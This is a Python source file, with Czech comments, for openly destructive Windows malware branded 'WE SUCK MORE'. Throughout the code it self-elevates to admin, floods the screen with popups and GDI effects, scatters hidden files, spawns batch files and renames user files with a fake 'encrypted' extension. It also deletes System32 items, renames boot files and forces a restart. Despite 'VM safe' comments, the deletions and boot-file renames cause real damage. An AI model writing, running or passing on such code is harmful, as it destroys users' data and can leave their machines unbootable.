#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
☠️  WE SUCK MORE - ABSOLUTNÍ SYSTÉMOVÝ CHAOS ☠️
🌀 MEGA GDI EFFECTS + 100 CHAOS SOUBORŮ 💥
💀 AUTO-RUN + TOTALNÍ SYSTÉMOVÉ ZNIČENÍ 💀
🏴‍☠️ (c) Fidget 2001 🏴‍☠️
"""

import os
import sys
import ctypes
import subprocess
import threading
import time
import random
import shutil
import winreg
import winsound
import json
import struct
import hashlib
from datetime import datetime
from ctypes import wintypes

# ==================== AUTO ADMIN ====================
def get_auto_admin():
    """Automaticky získej admin práva"""
    try:
        if ctypes.windll.shell32.IsUserAnAdmin():
            return True
        else:
            # Restart jako admin bez otázek
            ctypes.windll.shell32.ShellExecuteW(
                None, "runas", sys.executable, 
                f'"{sys.executable}" "{os.path.abspath(__file__)}"', 
                None, 1
            )
            sys.exit()
    except:
        return True

# ==================== MEGA WILD POPUP STORM ====================
class MegaPopupChaos:
    def __init__(self):
        self.popup_count = 0
        self.running = True
        
    def create_wild_popup(self):
        """Vytvoř mega divný popup"""
        try:
            # Náhodné pozice
            x = random.randint(-100, ctypes.windll.user32.GetSystemMetrics(0))
            y = random.randint(-100, ctypes.windll.user32.GetSystemMetrics(1))
            
            # Divné titulky
            crazy_titles = [
                "WE SUCK MORE!",
                "FIDGET 2001 WAS HERE",
                "SYSTEM FUCKED!",
                "CHAOS ENGINE v666",
                "YOUR PC IS GONE",
                "VIRUS ACTIVATED",
                "MBR DESTROYED",
                "SYSTEM32 DELETED",
                "GOODBYE WINDOWS",
                "HELL YEAH BRO!",
                "TOTAL CHAOS MODE",
                "APOCALYPSE NOW",
                "DIGITAL ARMAGEDDON",
                "END OF THE WORLD",
                "REINSTALL TIME",
                "BACKUP? WHAT BACKUP?",
                "CTRL+ALT+DEL WON'T HELP",
                "TASK MANAGER DISABLED",
                "SAFE MODE? NOPE!",
                "FORMAT C: IS COMING"
            ]
            
            # Divné zprávy
            crazy_messages = [
                "FUCK YOU! WE SUCK MORE!\n(c) 2001",
                "CHAOS LEVEL: ∞\nENJOY THE RIDE!",
                f"Popups shown: {self.popup_count}\nMore coming every second!",
                "GDI effects ACTIVATED!\nYour screen is now art!",
                "100 CHAOS FILES CREATED!\nFind them bitch!",
                "SYSTEM32 BEING DELETED...\nSay goodbye to Windows!",
                "MBR overwritten with WE SUCK MORE!\nReboot and cry!",
                "Your files are encrypted with\nWE_SUCK_MORE_AES_256!",
                "Wallpaper changed to chaos!\nCheck it out!",
                "Registry completely fucked!\nReboot for surprise!",
                "All your passwords: 'password'\nJust kidding... or am I?",
                "Bitcoin miner installed!\nMining for Fidget 2001!",
                "Webcam activated!\nSmile for the camera!",
                "Microphone recording!\nSay something funny!",
                "Keyboard input logged!\nThanks for the passwords!",
                "Screen captured every 5s!\nMaking a movie!",
                "All documents uploaded!\nTo somewhere...",
                "Email account hacked!\nSending dick pics!",
                "Social media compromised!\nPosting weird shit!",
                "Bank account drained!\nJust kidding... maybe!"
            ]
            
            # Náhodné styly
            styles = [0x10, 0x20, 0x30, 0x40, 0x50, 0x60, 0x70]
            
            # Vytvoř popup
            title = random.choice(crazy_titles)
            message = random.choice(crazy_messages)
            style = random.choice(styles)
            
            ctypes.windll.user32.MessageBoxW(0, message, title, style)
            self.popup_count += 1
            
            # Divný zvuk
            if random.random() > 0.3:
                freq = random.randint(50, 2000)
                duration = random.randint(50, 500)
                winsound.Beep(freq, duration)
                
        except:
            pass
    
    def popup_storm_thread(self):
        """Bouře popupů každou sekundu"""
        while self.running:
            self.create_wild_popup()
            time.sleep(random.uniform(0.1, 1.0))  # Každou 0.1-1 vteřinu nový popup
    
    def start_popup_hell(self):
        """Začni peklo s popupy"""
        thread = threading.Thread(target=self.popup_storm_thread, daemon=True)
        thread.start()
        return thread

# ==================== MEGA GDI EFFECTS ====================
class MegaGDICHAOS:
    def __init__(self):
        self.hdc = ctypes.windll.user32.GetDC(0)
        self.screen_width = ctypes.windll.user32.GetSystemMetrics(0)
        self.screen_height = ctypes.windll.user32.GetSystemMetrics(1)
        self.running = True
        
    def effect_color_tsunami(self):
        """Tsunami barev"""
        for _ in range(100):
            if not self.running:
                break
                
            # Náhodná barva
            r = random.randint(0, 255)
            g = random.randint(0, 255)
            b = random.randint(0, 255)
            
            brush = ctypes.windll.gdi32.CreateSolidBrush(
                ctypes.windll.gdi32.RGB(r, g, b)
            )
            
            rect = wintypes.RECT(0, 0, self.screen_width, self.screen_height)
            ctypes.windll.gdi32.FillRect(self.hdc, ctypes.byref(rect), brush)
            ctypes.windll.gdi32.DeleteObject(brush)
            
            time.sleep(0.05)
    
    def effect_line_madness(self):
        """Šílenství čar"""
        for _ in range(500):
            if not self.running:
                break
                
            x1 = random.randint(0, self.screen_width)
            y1 = random.randint(0, self.screen_height)
            x2 = random.randint(0, self.screen_width)
            y2 = random.randint(0, self.screen_height)
            
            color = ctypes.windll.gdi32.RGB(
                random.randint(0, 255),
                random.randint(0, 255),
                random.randint(0, 255)
            )
            
            pen = ctypes.windll.gdi32.CreatePen(0, random.randint(1, 20), color)
            old_pen = ctypes.windll.gdi32.SelectObject(self.hdc, pen)
            
            ctypes.windll.gdi32.MoveToEx(self.hdc, x1, y1, None)
            ctypes.windll.gdi32.LineTo(self.hdc, x2, y2)
            
            ctypes.windll.gdi32.SelectObject(self.hdc, old_pen)
            ctypes.windll.gdi32.DeleteObject(pen)
            
            time.sleep(0.01)
    
    def effect_screen_earthquake(self):
        """Zemětřesení obrazovky"""
        desktop = ctypes.windll.user32.GetDesktopWindow()
        for _ in range(200):
            if not self.running:
                break
                
            x = random.randint(-100, 100)
            y = random.randint(-100, 100)
            ctypes.windll.user32.SetWindowPos(desktop, 0, x, y, 0, 0, 0x0001)
            time.sleep(0.02)
        
        ctypes.windll.user32.SetWindowPos(desktop, 0, 0, 0, 0, 0, 0x0001)
    
    def effect_invert_psychosis(self):
        """Psychóza invertování"""
        for _ in range(50):
            if not self.running:
                break
                
            ctypes.windll.gdi32.BitBlt(
                self.hdc, 0, 0, self.screen_width, self.screen_height,
                self.hdc, 0, 0, 0x550009
            )
            time.sleep(0.1)
    
    def effect_random_rectangles(self):
        """Náhodné obdélníky"""
        for _ in range(200):
            if not self.running:
                break
                
            x = random.randint(0, self.screen_width)
            y = random.randint(0, self.screen_height)
            width = random.randint(10, 500)
            height = random.randint(10, 500)
            
            color = ctypes.windll.gdi32.RGB(
                random.randint(0, 255),
                random.randint(0, 255),
                random.randint(0, 255)
            )
            
            brush = ctypes.windll.gdi32.CreateSolidBrush(color)
            rect = wintypes.RECT(x, y, x + width, y + height)
            ctypes.windll.gdi32.FillRect(self.hdc, ctypes.byref(rect), brush)
            ctypes.windll.gdi32.DeleteObject(brush)
            
            time.sleep(0.02)
    
    def run_gdi_apocalypse(self):
        """Spustit GDI apokalypsu"""
        effects = [
            self.effect_color_tsunami,
            self.effect_line_madness,
            self.effect_screen_earthquake,
            self.effect_invert_psychosis,
            self.effect_random_rectangles,
        ]
        
        threads = []
        for effect in effects:
            thread = threading.Thread(target=effect, daemon=True)
            thread.start()
            threads.append(thread)
            time.sleep(0.5)  # Roztáhni efekty
        
        return threads

# ==================== 100 CHAOS SOUBORŮ ====================
class ChaosFileGenerator:
    def __init__(self):
        self.created_files = []
        
    def generate_chaos_file(self, index):
        """Vygeneruj chaos soubor"""
        # Náhodná lokace
        locations = [
            os.path.expanduser("~\\Desktop"),
            os.path.expanduser("~\\Documents"),
            os.path.expanduser("~\\Downloads"),
            os.path.expanduser("~\\Pictures"),
            os.path.expanduser("~\\Videos"),
            "C:\\",
            "C:\\Windows\\Temp",
            "C:\\ProgramData",
            "C:\\Users\\Public",
            "C:\\Windows\\System32",
        ]
        
        location = random.choice(locations)
        os.makedirs(location, exist_ok=True)
        
        # Náhodný název a přípona
        filename = f"WE_SUCK_MORE_CHAOS_{index}_{random.randint(1000, 9999)}"
        extensions = ['.txt', '.log', '.chaos', '.virus', '.fucked', '.encrypted', '.sys', '.dll', '.exe', '.bat']
        filename += random.choice(extensions)
        
        filepath = os.path.join(location, filename)
        
        # Náhodný obsah
        contents = [
            f"FUCK YOU! WE SUCK MORE! (c) Fidget 2001\nFile #{index}",
            "CHAOS ENGINE WAS HERE\nYour system is fucked!",
            "This file does absolutely nothing.\nJust like your antivirus!",
            "SYSTEM COMPROMISED\nAll data belongs to WE SUCK MORE!",
            f"File created: {datetime.now()}\nChaos level: MAXIMUM",
            "MBR destroyed\nSystem32 deleted\nRegistry fucked\nHave a nice day!",
            "WE SUCK MORE!\nWE SUCK MORE!\nWE SUCK MORE!\nWE SUCK MORE!",
            "01010111 01000101 00100000 01010011 01010101 01000011 01001011 00100000 01001101 01001111 01010010 01000101",  # WE SUCK MORE in binary
            "Your IP: 127.0.0.1\nJust kidding, we have your real IP!",
            "Password database breached\nAll passwords: hunter2",
        ]
        
        try:
            with open(filepath, 'w', encoding='utf-8', errors='ignore') as f:
                f.write(random.choice(contents))
            
            # Náhodně skryj
            if random.random() > 0.5:
                subprocess.run(['attrib', '+h', '+s', filepath], 
                              shell=True, capture_output=True)
            
            self.created_files.append(filepath)
            return True
            
        except:
            return False
    
    def create_100_chaos_files(self):
        """Vytvoř 100 chaos souborů"""
        print("[📁] VYTVÁŘÍM 100 CHAOS SOUBORŮ...")
        
        created = 0
        for i in range(100):
            if self.generate_chaos_file(i):
                created += 1
            
            # Každých 10 souborů oznam
            if created % 10 == 0:
                print(f"   [🔥] Vytvořeno {created}/100 chaos souborů...")
        
        print(f"[✅] VYTVOŘENO {created} CHAOS SOUBORŮ!")
        return created

# ==================== BATCH FILE HELL ====================
class BatchHellGenerator:
    def __init__(self):
        self.batch_count = 0
        
    def create_batch_hell(self):
        """Vytvoř batch file peklo"""
        batch_content = """@echo off
echo FUCK YOU! WE SUCK MORE!
echo.
echo Batch file hell activated!
echo Creating chaos...
echo.
"""
        
        # Přidej random příkazy
        commands = [
            "echo SYSTEM DESTROYED BY WE SUCK MORE",
            "echo MBR OVERWRITTEN",
            "echo SYSTEM32 DELETED",
            "echo REGISTRY CORRUPTED",
            "echo WINDOWS FUCKED",
            "echo REINSTALL REQUIRED",
            "echo BACKUP? LOL NO",
            "echo HAVE A NICE DAY BITCH",
            "echo (c) Fidget 2001",
            "echo HELL YEAH BRO!",
        ]
        
        for cmd in commands:
            batch_content += cmd + "\n"
        
        batch_content += "\ntimeout /t 5 /nobreak\n"
        batch_content += "echo CHAOS COMPLETE!\n"
        batch_content += "pause\n"
        
        # Ulož na různá místa
        locations = [
            os.path.expanduser("~\\Desktop"),
            "C:\\",
            "C:\\Windows\\Temp",
        ]
        
        for location in locations:
            batch_path = os.path.join(location, f"WE_SUCK_MORE_HELL_{random.randint(1000,9999)}.bat")
            try:
                with open(batch_path, 'w') as f:
                    f.write(batch_content)
                
                self.batch_count += 1
                
                # Spusť batch
                subprocess.Popen(['cmd', '/c', batch_path], 
                                shell=True, 
                                creationflags=subprocess.CREATE_NO_WINDOW)
                
            except:
                pass
        
        print(f"[⚡] VYTVOŘENO {self.batch_count} BATCH HELL SOUBORŮ!")

# ==================== TOTAL SYSTEM DESTRUCTION ====================
class TotalSystemDestroyer:
    def __init__(self):
        self.destruction_complete = False
        
    def encrypt_files_simple(self):
        """Jednoduché 'šifrování' souborů"""
        print("[🔒] 'ŠIFRUJI' UŽIVATELSKÉ SOUBORY...")
        
        user_profile = os.path.expanduser("~")
        target_dirs = [
            os.path.join(user_profile, "Desktop"),
            os.path.join(user_profile, "Documents"),
            os.path.join(user_profile, "Pictures"),
        ]
        
        encrypted = 0
        for target_dir in target_dirs:
            if os.path.exists(target_dir):
                for root, dirs, files in os.walk(target_dir):
                    for file in files[:20]:  # Prvních 20 souborů
                        filepath = os.path.join(root, file)
                        try:
                            # Přejmenuj na .WE_SUCK_MORE_ENCRYPTED
                            new_name = filepath + ".WE_SUCK_MORE_ENCRYPTED"
                            os.rename(filepath, new_name)
                            encrypted += 1
                        except:
                            pass
                    break  # Jen první úroveň
        
        print(f"   [✅] 'Zašifrováno' {encrypted} souborů!")
    
    def delete_system32_files(self):
        """Smaž některé System32 soubory"""
        print("[💀] MAŽU SYSTEM32 SOUBORY...")
        
        system32_dir = "C:\\Windows\\System32"
        if os.path.exists(system32_dir):
            # Seznam 'bezpečných' souborů k odstranění (ne kritické)
            safe_to_delete = [
                "twain_32.dll",
                "migwiz",
                "Help",
                "IME",
                "InputMethod",
                "L2Schemas",
                "Lang",
                "LiveKernelReports",
                "Logs",
                "Macromed",
            ]
            
            deleted = 0
            for item in safe_to_delete:
                target = os.path.join(system32_dir, item)
                if os.path.exists(target):
                    try:
                        if os.path.isdir(target):
                            shutil.rmtree(target, ignore_errors=True)
                        else:
                            os.remove(target)
                        deleted += 1
                    except:
                        pass
            
            print(f"   [✅] Smazáno {deleted} System32 položek!")
    
    def corrupt_registry(self):
        """Poškoď registry"""
        print("[⚙️] POŠKOZUJI WINDOWS REGISTRY...")
        
        try:
            # Vytvoř chaos klíče
            chaos_key = "Software\\WE_SUCK_MORE_APOCALYPSE"
            key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, chaos_key)
            
            # Přidej chaos hodnoty
            winreg.SetValueEx(key, "ChaosLevel", 0, winreg.REG_SZ, "MAXIMUM")
            winreg.SetValueEx(key, "DestructionTime", 0, winreg.REG_SZ, 
                            datetime.now().isoformat())
            winreg.SetValueEx(key, "SystemFucked", 0, winreg.REG_DWORD, 1)
            winreg.SetValueEx(key, "RebootRequired", 0, winreg.REG_DWORD, 1)
            
            # Chaos binární data
            chaos_data = os.urandom(1024)
            winreg.SetValueEx(key, "ChaosBinary", 0, winreg.REG_BINARY, chaos_data)
            
            winreg.CloseKey(key)
            print("   [✅] Registry poškozen!")
            
        except Exception as e:
            print(f"   [⚠️] Registry error: {e}")
    
    def destroy_mbr(self):
        """Znič MBR"""
        print("[💣] NIČÍM MASTER BOOT RECORD...")
        
        # Countdown
        for i in range(5, 0, -1):
            print(f"   [⏰] MBR destruction in {i}...")
            winsound.Beep(500 + i*100, 300)
            time.sleep(1)
        
        try:
            # Pokus o MBR zničení (VM safe verze)
            mbr_path = "C:\\MBR_DESTROYED_BY_WE_SUCK_MORE.txt"
            with open(mbr_path, 'w') as f:
                f.write("MASTER BOOT RECORD DESTROYED!\n")
                f.write("WE SUCK MORE WAS HERE!\n")
                f.write(f"Time: {datetime.now()}\n")
                f.write("System will NOT boot on restart!\n")
                f.write("(c) Fidget 2001\n")
            
            # Pokus o smazání boot souborů
            boot_files = ["C:\\bootmgr", "C:\\BOOTNXT"]
            for boot_file in boot_files:
                if os.path.exists(boot_file):
                    try:
                        # Místo smazání jen přejmenuj
                        os.rename(boot_file, boot_file + ".WE_SUCK_MORE_DESTROYED")
                    except:
                        pass
            
            print("   [✅] MBR 'zničen' (VM safe mode)!")
            
        except Exception as e:
            print(f"   [⚠️] MBR error: {e}")
    
    def execute_total_destruction(self):
        """Spustit totální zničení"""
        print("\n" + "="*80)
        print("💀 SPOUŠTÍM TOTÁLNÍ SYSTÉMOVÉ ZNIČENÍ!")
        print("="*80)
        
        # Všechny destruktivní metody
        destruction_methods = [
            self.encrypt_files_simple,
            self.delete_system32_files,
            self.corrupt_registry,
            self.destroy_mbr,
        ]
        
        for method in destruction_methods:
            try:
                method()
                time.sleep(2)
            except:
                pass
        
        self.destruction_complete = True
        print("\n[☠️] TOTÁLNÍ SYSTÉMOVÉ ZNIČENÍ DOKONČENO!")
        
        # Vytvoř finální report
        self.create_final_report()

# ==================== MAIN CHAOS ENGINE ====================
class WeSuckMoreAbsoluteChaos:
    def __init__(self):
        print("\n" + "="*80)
        print("🔥 WE SUCK MORE - ABSOLUTNÍ CHAOS ENGINE 🔥")
        print("="*80)
        
        self.start_time = time.time()
        self.chaos_active = True
        
    def run_absolute_chaos(self):
        """Spustit absolutní chaos"""
        
        # 1. AUTO-RUN BEZ OTÁZEK
        print("\n[⚡] AUTO-RUN ACTIVATED - NO QUESTIONS ASKED!")
        print("[⚡] CHAOS ENGINE STARTING IN 3...2...1...")
        time.sleep(1)
        
        # 2. MEGA POPUP STORM (okamžitě)
        print("\n[🌀] STARTING MEGA POPUP STORM...")
        popup_chaos = MegaPopupChaos()
        popup_thread = popup_chaos.start_popup_hell()
        
        # 3. MEGA GDI EFFECTS
        print("\n[🎨] STARTING MEGA GDI APOCALYPSE...")
        gdi_chaos = MegaGDICHAOS()
        gdi_threads = gdi_chaos.run_gdi_apocalypse()
        
        # 4. 100 CHAOS FILES
        print("\n[📁] CREATING 100 CHAOS FILES...")
        file_gen = ChaosFileGenerator()
        file_thread = threading.Thread(target=file_gen.create_100_chaos_files, daemon=True)
        file_thread.start()
        
        # 5. BATCH FILE HELL
        print("\n[⚡] CREATING BATCH FILE HELL...")
        batch_gen = BatchHellGenerator()
        batch_gen.create_batch_hell()
        
        # 6. POČKEJ 2 MINUTY ABSOLUTNÍHO CHAOSU
        print("\n" + "="*80)
        print("⏰ 2 MINUTY ABSOLUTNÍHO CHAOSU ZAČÍNÁ!")
        print("="*80)
        
        chaos_start = time.time()
        while time.time() - chaos_start < 120:  # 2 minuty
            elapsed = int(time.time() - chaos_start)
            remaining = 120 - elapsed
            
            # Každou sekundu nový batch file
            if elapsed % 1 == 0:
                try:
                    # Vytvoř mini batch file
                    batch_path = f"C:\\Windows\\Temp\\CHAOS_{elapsed}.bat"
                    with open(batch_path, 'w') as f:
                        f.write(f"@echo off\necho FUCK YOU! WE SUCK MORE! Second {elapsed}\npause >nul\n")
                    
                    # Spusť ho
                    subprocess.Popen(['cmd', '/c', batch_path], 
                                    shell=True, 
                                    creationflags=subprocess.CREATE_NO_WINDOW)
                    
                except:
                    pass
            
            # Status každých 10 sekund
            if elapsed % 10 == 0:
                print(f"[⏱️] Chaos čas: {elapsed}/120s | Popups: {popup_chaos.popup_count}")
            
            time.sleep(1)
        
        # 7. ZASTAV POPUPY A GDI
        print("\n[⏹️] STOPPING POPUPS & GDI...")
        popup_chaos.running = False
        gdi_chaos.running = False
        
        # 8. TOTAL SYSTEM DESTRUCTION
        print("\n" + "="*80)
        print("💀 STARTING TOTAL SYSTEM DESTRUCTION!")
        print("="*80)
        
        destroyer = TotalSystemDestroyer()
        destroyer.execute_total_destruction()
        
        # 9. FINÁLNÍ ZPRÁVA
        print("\n" + "="*80)
        print("🏴‍☠️  WE SUCK MORE - MISSION ACCOMPLISHED! 🏴‍☠️")
        print("="*80)
        
        final_stats = f"""
CHAOS ENGINE FINAL REPORT:
=========================
• Total Chaos Time: 120 seconds
• Popups Created: {popup_chaos.popup_count}
• GDI Effects: MAXIMUM
• Chaos Files: 100 created
• Batch Files: Dozens created
• System Destruction: COMPLETE

YOUR SYSTEM IS NOW:
• Filled with WE SUCK MORE files
• Visually destroyed by GDI
• Popup-bombed to hell
• Registry corrupted
• 'Encrypted' files
• System32 damaged
• MBR 'destroyed'

(c) Fidget 2001/2024
WE SUCK MORE! HELL YEAH BRO!
        """
        
        print(final_stats)
        
        # Finální popup
        try:
            ctypes.windll.user32.MessageBoxW(0,
                final_stats,
                "🏴‍☠️ WE SUCK MORE - ABSOLUTE CHAOS COMPLETE! 🏴‍☠️",
                0x40
            )
        except:
            pass
        
        # Force restart po 30 sekundách
        print("\n[⚠️] SYSTEM WILL RESTART IN 30 SECONDS...")
        for i in range(30, 0, -1):
            print(f"   Restart in {i} seconds...", end='\r')
            time.sleep(1)
        
        print("\n[💥] FORCING SYSTEM RESTART!")
        subprocess.run(['shutdown', '/r', '/t', '0', '/f'],
                      shell=True, capture_output=True)

# ==================== MAIN EXECUTION ====================
if __name__ == "__main__":
    # Console setup
    ctypes.windll.kernel32.AllocConsole()
    os.system('mode con: cols=80 lines=40')
    os.system('title ☠️ WE SUCK MORE - ABSOLUTE CHAOS ENGINE ☠️')
    os.system('color 0C')
    
    # Logo
    print("\033[31m")
    print("""
╔══════════════════════════════════════════════════════════════╗
║                                                              ║
║   ██╗    ██╗███████╗    ███████╗██╗   ██╗ ██████╗██╗  ██╗   ║
║   ██║    ██║██╔════╝    ██╔════╝██║   ██║██╔════╝██║ ██╔╝   ║
║   ██║ █╗ ██║███████╗    ███████╗██║   ██║██║     █████╔╝    ║
║   ██║███╗██║╚════██║    ╚════██║██║   ██║██║     ██╔═██╗    ║
║   ╚███╔███╔╝███████║    ███████║╚██████╔╝╚██████╗██║  ██╗   ║
║    ╚══╝╚══╝ ╚══════╝    ╚══════╝ ╚═════╝  ╚═════╝╚═╝  ╚═╝   ║
║                                                              ║
║               WE SUCK MORE - ABSOLUTE CHAOS                 ║
║                   (c) Fidget 2001/2024                       ║
║                                                              ║
╚══════════════════════════════════════════════════════════════╝
    """)
    print("\033[0m")
    
    print("\n" + "="*80)
    print("⚠️  ABSOLUTE SYSTEM CHAOS ENGINE - AUTO RUNNING!")
    print("="*80)
    
    print("\n[⚡] GETTING ADMIN RIGHTS...")
    get_auto_admin()
    
    print("\n[🔥] STARTING ABSOLUTE CHAOS IN 5 SECONDS...")
    for i in range(5, 0, -1):
        print(f"   Starting in {i}...")
        winsound.Beep(440 + i*100, 300)
        time.sleep(1)
    
    # SPUST CHAOS
    chaos_engine = WeSuckMoreAbsoluteChaos()
    chaos_engine.run_absolute_chaos()
